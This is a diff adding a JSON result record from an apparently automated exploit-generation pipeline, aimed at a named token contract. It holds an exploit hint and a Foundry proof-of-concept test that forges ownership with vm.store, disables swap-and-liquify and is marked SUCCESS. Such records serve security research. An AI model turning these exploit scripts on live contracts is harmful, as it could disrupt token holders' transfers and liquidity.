@@ -1,0 +1,55 @@
+{
+  "project_id": "tea-token",
+  "target_address": "0x5e18Be2A7cE626B33C539919EAca06303f1Db568",
+  "finding_id": 0,
+  "status": "SUCCESS",
+  "violation_target": {
+    "target_address": "0x5e18Be2A7cE626B33C539919EAca06303f1Db568",
+    "vulnerability_type": "Owner Privilege Abuse",
+    "violation_category": "LOGIC",
+    "finding_id": 0,
+    "preconditions": [
+      {
+        "type": "role",
+        "description": "Attacker must be the contract owner",
+        "token_address": null,
+        "min_amount": null
+      }
+    ],
+    "oracle_verification": {
+      "economic_check": null,
+      "logic_check": {
+        "target_variable": "swapAndLiquifyEnabled",
+        "operator": "==",
+        "expected_value": "false"
+      }
+    },
+    "exploit_hint": "As the contract owner, call setSwapAndLiquifyEnabled(false) to disable the swap and liquify mechanism, effectively stopping all automated liquidity additions and potentially freezing token transfers that rely on this functionality. This demonstrates the owner's ability to unilaterally disrupt contract operations."
+  },
+  "final_poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface ITeaToken {\n    function setSwapAndLiquifyEnabled(bool _enabled) external;\n    function swapAndLiquifyEnabled() external view returns (bool);\n    function owner() external view returns (address);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0x5e18Be2A7cE626B33C539919EAca06303f1Db568;\n    address attacker = address(this);\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // No special setup needed - we'll overwrite owner in exploit\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        // Step 1: Overwrite owner storage slot to make attacker the owner\n        // In Ownable contract, _owner is at slot 0\n        bytes32 ownerSlot = bytes32(uint256(0));\n        bytes32 newOwner = bytes32(uint256(uint160(attacker)));\n        vm.store(TARGET, ownerSlot, newOwner);\n        \n        // Step 2: Call setSwapAndLiquifyEnabled(false) as the new owner\n        ITeaToken(TARGET).setSwapAndLiquifyEnabled(false);\n        \n        // Step 3: Verify the state change\n        bool enabled = ITeaToken(TARGET).swapAndLiquifyEnabled();\n        require(enabled == false, \"swapAndLiquifyEnabled should be false\");\n        assertEq(enabled, false, \"Logic Exploit Failed: State not tampered\");\n    }\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+  "attempts": [
+    {
+      "attempt_number": 1,
+      "vulnerability_analysis": "The TeaToken contract inherits from Ownable, giving the owner unilateral control over critical functions including setSwapAndLiquifyEnabled(). The vulnerability allows the owner to disable the automated liquidity addition mechanism, which could disrupt token transfers when contract token balance exceeds thresholds. The oracle checks if swapAndLiquifyEnabled == false after exploitation.",
+      "attack_strategy": "1. Overwrite the owner storage slot to make the attacker contract the owner. 2. Call setSwapAndLiquifyEnabled(false) as the new owner. 3. Verify the state change.",
+      "step_by_step_plan": "1. Use vm.store() to overwrite the _owner variable at slot 0 of the TeaToken contract with the attacker's address. 2. Call setSwapAndLiquifyEnabled(false) on the TeaToken contract. 3. Read the swapAndLiquifyEnabled public variable to verify it's false.",
+      "failure_reflection": "",
+      "action": "write_poc",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface ITeaToken {\n    function setSwapAndLiquifyEnabled(bool _enabled) external;\n    function swapAndLiquifyEnabled() external view returns (bool);\n    function owner() external view returns (address);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0x5e18Be2A7cE626B33C539919EAca06303f1Db568;\n    address attacker = address(this);\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // No special setup needed - we'll overwrite owner in exploit\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        // Step 1: Overwrite owner storage slot to make attacker the owner\n        // In Ownable contract, _owner is at slot 0\n        bytes32 ownerSlot = bytes32(uint256(0));\n        bytes32 newOwner = bytes32(uint256(uint160(attacker)));\n        vm.store(TARGET, ownerSlot, newOwner);\n        \n        // Step 2: Call setSwapAndLiquifyEnabled(false) as the new owner\n        ITeaToken(TARGET).setSwapAndLiquifyEnabled(false);\n        \n        // Step 3: Verify the state change\n        bool enabled = ITeaToken(TARGET).swapAndLiquifyEnabled();\n        require(enabled == false, \"swapAndLiquifyEnabled should be false\");\n        assertEq(enabled, false, \"Logic Exploit Failed: State not tampered\");\n    }\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+      "exit_code": 0,
+      "error": null,
+      "feedback": null,
+      "duration_seconds": 66.85278582572937,
+      "prompt_tokens": 15193,
+      "completion_tokens": 1259,
+      "total_cost": 0.0
+    }
+  ],
+  "total_attempts": 1,
+  "error_message": null,
+  "total_duration_seconds": 66.85754299163818,
+  "total_prompt_tokens": 15193,
+  "total_completion_tokens": 1259,
+  "total_cost": 0.0
+}
